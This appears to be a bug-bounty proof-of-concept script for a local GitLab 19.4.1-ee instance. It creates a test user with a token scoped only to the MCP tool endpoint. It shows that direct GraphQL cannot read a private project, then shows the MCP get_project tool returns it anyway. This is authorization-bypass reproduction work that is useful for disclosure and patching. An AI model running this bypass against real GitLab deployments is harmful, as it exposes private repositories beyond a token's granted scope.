#!/usr/bin/env bash
set -euo pipefail

BASE="${BASE:-http://127.0.0.1:8080}"
CONTAINER="${CONTAINER:-gitlab}"
OUT="${OUT:-artifacts}"
mkdir -p "$OUT"

api() {
  local token="$1" method="$2" path="$3"; shift 3
  curl -sS --fail-with-body --request "$method" \
    --header "PRIVATE-TOKEN: $token" "$@" "$BASE/api/v4$path"
}

echo "===== enable MCP + bootstrap root token ====="
docker cp security/gitlab-mcp-gpat/bootstrap.rb "$CONTAINER:/tmp/h1-mcp-bootstrap.rb"
BOOT="$(docker exec "$CONTAINER" gitlab-rails runner /tmp/h1-mcp-bootstrap.rb)"
ROOT_TOKEN="$(printf '%s\n' "$BOOT" | sed -n 's/^H1_ROOT_TOKEN=//p' | tail -1)"
test -n "$ROOT_TOKEN"

STAMP="$(date +%s)"
USERNAME="h1mcp$STAMP"
EMAIL="$USERNAME@example.test"
PASSWORD="H1-Mcp-Test-$STAMP-Aa1!"

echo "===== create isolated user/group/private project ====="
USER_JSON="$(api "$ROOT_TOKEN" POST /users \
  --data-urlencode "username=$USERNAME" \
  --data-urlencode "name=H1 MCP GPAT Test" \
  --data-urlencode "email=$EMAIL" \
  --data-urlencode "password=$PASSWORD" \
  --data-urlencode "skip_confirmation=true")"
USER_ID="$(jq -r '.id' <<<"$USER_JSON")"

GROUP_JSON="$(api "$ROOT_TOKEN" POST /groups \
  --data-urlencode "name=h1-mcp-$STAMP" \
  --data-urlencode "path=h1-mcp-$STAMP" \
  --data-urlencode "visibility=private")"
GROUP_ID="$(jq -r '.id' <<<"$GROUP_JSON")"

PROJECT_JSON="$(api "$ROOT_TOKEN" POST /projects \
  --data-urlencode "name=private-target" \
  --data-urlencode "path=private-target" \
  --data-urlencode "namespace_id=$GROUP_ID" \
  --data-urlencode "visibility=private")"
PROJECT_ID="$(jq -r '.id' <<<"$PROJECT_JSON")"
PROJECT_PATH="$(jq -r '.path_with_namespace' <<<"$PROJECT_JSON")"

api "$ROOT_TOKEN" POST "/groups/$GROUP_ID/members" \
  --data-urlencode "user_id=$USER_ID" \
  --data-urlencode "access_level=30" >"$OUT/membership.json"

printf '%s\n' "$USER_JSON" >"$OUT/user.json"
printf '%s\n' "$PROJECT_JSON" >"$OUT/project.json"

echo "===== create GPAT with ONLY execute_mcp_tool on user boundary ====="
docker cp security/gitlab-mcp-gpat/create_gpat.rb "$CONTAINER:/tmp/h1-create-mcp-gpat.rb"
SETUP="$(docker exec -e H1_USER_ID="$USER_ID" "$CONTAINER" gitlab-rails runner /tmp/h1-create-mcp-gpat.rb)"
printf '%s\n' "$SETUP" | sed -E 's/(H1_GPAT=).*/\1[REDACTED]/' | tee "$OUT/gpat-scope.txt"
GPAT="$(printf '%s\n' "$SETUP" | sed -n 's/^H1_GPAT=//p' | tail -1)"
test -n "$GPAT"

echo "===== CONTROL: direct GraphQL with same GPAT must NOT read private project ====="
DIRECT_BODY="$(jq -cn --arg q "query { project(fullPath: \"$PROJECT_PATH\") { id name fullPath visibility webUrl } }" '{query:$q}')"
DIRECT="$(curl -sS --fail-with-body \
  -H "PRIVATE-TOKEN: $GPAT" -H 'Content-Type: application/json' \
  --data-binary "$DIRECT_BODY" "$BASE/api/graphql")"
printf '%s\n' "$DIRECT" | tee "$OUT/direct-graphql.json"

if jq -e '.data.project != null' <<<"$DIRECT" >/dev/null 2>&1; then
  echo "ISOLATION_INVALID: direct GraphQL already reads project"
  exit 21
fi

echo "===== MCP: same GPAT calls get_project on same private project ====="
MCP_BODY="$(jq -cn --arg p "$PROJECT_PATH" '{
  jsonrpc:"2.0",
  id:"h1-1",
  method:"tools/call",
  params:{name:"get_project",arguments:{project_id:$p}}
}')"

MCP="$(curl -sS --fail-with-body \
  -H "PRIVATE-TOKEN: $GPAT" -H 'Content-Type: application/json' \
  --data-binary "$MCP_BODY" "$BASE/api/v4/mcp")"
printf '%s\n' "$MCP" | tee "$OUT/mcp-get-project.json"

MCP_PATH="$(jq -r '.result.structuredContent.path_with_namespace // .result.structuredContent.fullPath // empty' <<<"$MCP" 2>/dev/null || true)"
if [[ -z "$MCP_PATH" ]]; then
  MCP_PATH="$(jq -r '.result.content[0].text // empty' <<<"$MCP" 2>/dev/null | jq -r '.path_with_namespace // .fullPath // empty' 2>/dev/null || true)"
fi

{
  echo "GitLab: 19.4.1-ee.0"
  echo "Project: $PROJECT_PATH"
  echo "Granular PAT scope: execute_mcp_tool @ user boundary only"
  echo "Direct GraphQL project result: $(jq -c '.data.project // null' <<<"$DIRECT")"
  echo "MCP returned project path: ${MCP_PATH:-<none>}"
} | tee "$OUT/summary.txt"

if [[ "$MCP_PATH" == "$PROJECT_PATH" ]]; then
  echo "H1_RESULT=PASS granular-token project scope bypass via MCP GraphQL tool" | tee -a "$OUT/summary.txt"
  exit 0
fi

echo "H1_RESULT=NOT_REPRODUCED" | tee -a "$OUT/summary.txt"
exit 22
